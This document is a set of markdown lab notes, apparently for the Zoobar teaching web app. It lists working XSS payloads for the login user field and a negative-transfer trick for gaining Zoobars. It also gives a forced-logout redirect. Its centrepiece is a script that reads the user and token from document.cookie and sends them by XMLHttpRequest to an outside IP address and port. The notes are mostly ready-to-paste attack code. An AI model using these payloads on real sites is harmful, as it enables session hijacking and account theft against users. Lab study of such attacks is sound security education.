- This payload may be applied to the **user** field in the login screen
```html
    " type="text" > <script> alert("hi");</script> <input style="none
```

- Above payload may **insert a textbox** in the output page, you may try : 
```html
    " type="text" > <script>  alert("hi") ; </script> <input type="hidden
```

- You may also try to send **negetive Zoobars** to the receiver. That fetches you zoobars

- After the user is login into the portal, Server genrates the **cookie**.
    - Cookies can be stolen from the same XSS vulnerability in textbox.
    - But this time we will inject script in **user textbox**
    ```html
        " size=10> <script> alert(document.cookie);</script> <input type="hidden
    ```
    - More advance way is not to alert the user, rather send it to server.
    ```html
        " size=10> 
            <script>
                var xmlreq=new XMLHttpRequest(); 
                var user = document.cookie.split('#')[0];
                var token = document.cookie.split('#')[1];
                var url="http://172.27.21.91:8989?payload="+"user="+user+"&token="+token;
                xmlreq.open('GET',url,true);
                xmlreq.send();
            </script>
        <input type="hidden
    ```

- Can we make user logout of the Machine
    ```html
        " size=10> 
            <script>
		setTimeout(function(){window.location="http://localhost:8080/zoobar/index.cgi/logout"}, 2000);
    	   </script>
    	   <input type="hidden
    	<input type="hidden
    ```
